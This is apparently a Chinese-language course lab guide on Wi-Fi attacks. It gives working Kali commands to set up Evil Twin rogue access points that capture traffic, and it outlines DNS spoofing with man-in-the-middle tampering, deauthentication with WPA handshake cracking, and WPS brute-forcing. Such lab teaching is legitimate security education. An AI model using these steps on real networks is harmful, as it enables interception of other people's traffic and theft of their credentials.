# 实验


## Evil Twin基础实验（不支持AP模式的网卡）

```bash

# 虚拟机建议使用NAT模式联网

# 安装网络桥接配置工具包
apt-get update && apt-get install bridge-utils

# 启用指定的无线网卡，注意看清楚自己本机上识别出的无线网卡标识是否是wlan0
ifconfig wlan0 up

# 设置wlan0工作在监听模式
airmon-ng start wlan0

# 解决部分无线网卡在Kali 2.0系统中设置监听模式失败，杀死可能会导致aircrack-ng套件工作异常的相关进程
airmon-ng check kill

# 设置处于监听模式的网卡的工作channel，以下只是一个示例。可以根据需要，指定工作在其他有效channel: 1 ~ 13
iwconfig wlan0mon channel 1

# 开启一个无认证和无加密机制的无线热点CUC
airbase-ng --essid CUC wlan0mon

# 上述命令执行成功之后，会创建一个虚拟网卡：at0
# 下面的操作步骤，把at0桥接到eth0上

# 创建桥接网卡，命名为mitm
brctl addbr mitm

# 启用前述步骤创建的虚拟网卡
ifconfig at0 up

# 查看桥接网卡配置
brctl show

# 添加有线网卡到桥接网卡
brctl addif mitm eth0
# 添加虚拟无线SoftAp模式网卡到桥接网卡
brctl addif mitm at0

# 配置桥接网络
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig mitm up

# 非必选步骤，取决于mitm是否分配到了IP地址
dhclient mitm

# 非必选步骤，若动态获取IP地址失败，无法上网
#1设置静态ip地址
ifconfig mitm 10.0.2.15 netmask 255.255.255.0

#2设置静态路由
route add default gw 10.0.2.2 dev mitm

# 验证mitm桥接接口是否已获得了IP地址
ifconfig mitm

# 用抓包器开始对桥接网卡mitm进行抓包
tcpdump -i mitm -w mitm.pcap
```

## Evil Twin基础实验（支持AP模式的网卡）

先确认当前使用的网卡支持AP模式

```
iw list

...

    Supported interface modes:
         * AP

...

```

如上所示的命令行输出表示当前网卡支持AP模式，如果没有出现 ```* AP```字样，则表示当前网卡不支持AP模式，无法使用以下方法配置网卡工作在AP模式下。


```bash
# 安装AP配置管理工具：hostapd 和 简易DNS&DHCP服务器：dnsmasq
apt-get update && apt-get install -y hostapd dnsmasq

# 创建并编辑 /etc/hostapd/hostapd.conf，内容如下实例所示
cat << EOF > /etc/hostapd/hostapd.conf
ssid=just_a_joke
wpa_passphrase=JokePassword
interface=wlan0
auth_algs=3
channel=6
driver=nl80211
hw_mode=g
logger_stdout=-1
logger_stdout_level=2
max_num_sta=5
rsn_pairwise=CCMP
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
EOF

# 备份/etc/dnsmasq.conf
cp /etc/dnsmasq.conf /etc/dnsmasq.conf.orig

# 使用简化版dnsmasq配置文件内容
cat << EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.10.10.1
#address=/google.com/10.10.10.1
interface=wlan0
dhcp-range=10.10.10.10,10.10.10.250,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,10.10.10.1
#no-resolv
log-queries
EOF

# 启动dnsmasq服务
service dnsmasq start

# 启用无线网卡
ifconfig wlan0 up
ifconfig wlan0 10.10.10.1/24

# 配置防火墙将wlan0的流量转发到有线网卡
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# 开启Linux内核的IPv4数据转发功能
echo '1' > /proc/sys/net/ipv4/ip_forward

# 启动hostapd（调试模式启动）
hostapd -d /etc/hostapd/hostapd.conf

# 用抓包器开始对桥接网卡mitm进行抓包
tcpdump -i wlan0 -w wlan0.pcap
```

通过以上hostapd+dnsmasq方式配置的软AP，会利用dnsmasq的log-queries指令自动将所有通过wlan0的DNS查询和响应结果记录到log-facility指令定义的日志文件中。

### 常见故障

如果在执行 ```hostapd -d /etc/hostapd/hostapd.conf``` 遇到如下错误信息（ ```nl80211: Could not configure driver mode```）

```
Configuration file: hostapd.conf
nl80211: Could not configure driver mode
nl80211 driver initialization failed.
hostapd_free_hapd_data: Interface wlan0 wasn't started
```

首先要排除的是硬件和虚拟机连接的不可描述bug，已知解决方法包括（由简单到复杂进行尝试排错）：

* 重新插拔USB无线网卡、更换USB连接口、重启虚拟机，重试即可
* 使用 ```airmon-ng check kill```，重试即可
* 参考[hostapd官网文档](https://wireless.wiki.kernel.org/en/users/Documentation/hostapd)下载hostapd源代码重新编译，增加对nl80211驱动的支持。（不到万不得已，不需要使用该方法）

```bash
mkdir -p ~/workspace/drivers
cd ~/workspace/drivers
git clone git://w1.fi/srv/git/hostap.git
cd hostap/hostapd
cp defconfig .config
sed -i.bak s/#CONFIG_DRIVER_NL80211=y/CONFIG_DRIVER_NL80211=y/g .config
sed -i.bak s/#CONFIG_LIBNL32=y/CONFIG_LIBNL32=y/g .config
apt-get install libnl-genl-3-dev libssl-dev
make 
./hostapd /etc/hostapd/hostapd.conf
```


[hostpad启动时遇到Unable to create AP with hostapd due to lack of entropy问题的解决办法](https://bbs.archlinux.org/viewtopic.php?id=151342)

```bash
apt-get install haveged
```

## Windows Evil Twin（配置SoftAP，共享无线热点）

```
# 以管理员身份运行cmd.exe

# 设定虚拟WiFi
netsh wlan set hostednetwork mode=allow ssid=WiFiname key=WiFikey

# 启动虚拟WiFi，在控制面板网络连接中看到生成了一个“Microsoft Hosted Network Virtual Adapter”
netsh wlan start hostednetwork

# 设置有线网络共享
在控制面板网络连接中右键以太网（有线网络，上网网卡）属性，共享中勾选“允许其他网络用户通过此计算机的Internet连接来连接”，家庭网络连接中选择上一步生成的“Microsoft Hosted Network Virtual Adapter”虚拟网卡名称。

# 手机无线连接WiFiname网络即可
```

## Evil Twin扩展实验

### dns欺骗

在Evil Twin基础实验成功的基础上，使用DNS欺骗的方式（例如借助dnsspoof）将所有受害客户端的HTTP/HTTPS类DNS请求解析到攻击者可控的HTTP/HTTPS透明代理服务器（例如借助burpsuite），然后对HTTP/HTTPS流量进行双向中间人攻击（嗅探和篡改）。

### 攻击离线客户端

在Evil Twin基础实验成功的基础上，针对not associated client，通过分析这些离线客户端的probe request中包含的ESSID信息，使用airbase-ng搭建伪造的启用WPA/WPA2 PSK AP，让这些离线客户端主动来伪造AP上尝试认证，获取WPA/WPA2 PSK 4次握手包的前2个用于离线的PSK口令字典破解。

## WPA/WPA2 PSK破解实验

通过de-auth攻击强制在线客户端下线，获得客户端重连时的4次握手包，导入aircrack-ng进行离线破解。与此同时，还可以使用genpmk加速口令破解过程。

## WPS破解实验

请阅读[Offline bruteforce attack on WiFi Protected Setup (Hacklu2014)](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)和[Pixie Dust Attack WPS in Kali Linux with Reaver](http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/)后动手实验。

# Kali系统上的现成口令/字典文件

/usr/share/wordlists目录下应有尽有。

除此之外，还可以利用crunch按需生成口令字典文件，使用方法请man crunch。


## 延伸阅读

* [一个shell脚本封装的一键开启evil twins热点的脚本示例](https://github.com/c4pr1c3/learngit/blob/master/bash/evil_twins/start_mitm_ap.sh)
* [路由器相关缺陷汇总](http://www.routerpwn.com/) | [路由器相关缺陷汇总-github](https://github.com/hkm/routerpwn.com)
* [路由器出厂默认口令查询](http://www.routerpasswords.com/)
* [路由器安全自测自评](http://www.routercheck.com/)
* 推荐搜索：d-link csrf exploit
* [Evil Twin Attack Using Kali Linux](https://www.cybrary.it/0p3n/evil-twin-attack-using-kali-linux/)
* [Software access point on Archlinux](https://wiki.archlinux.org/index.php/Software_access_point)
* [Multiple SSIDs with hostapd](http://wiki.stocksy.co.uk/wiki/Multiple_SSIDs_with_hostapd)
* [Targeted evil twin attacks against WPA2-Enterprise networks. Indirect wireless pivots using hostile portal attacks.](https://github.com/s0lst1c3/eaphammer)

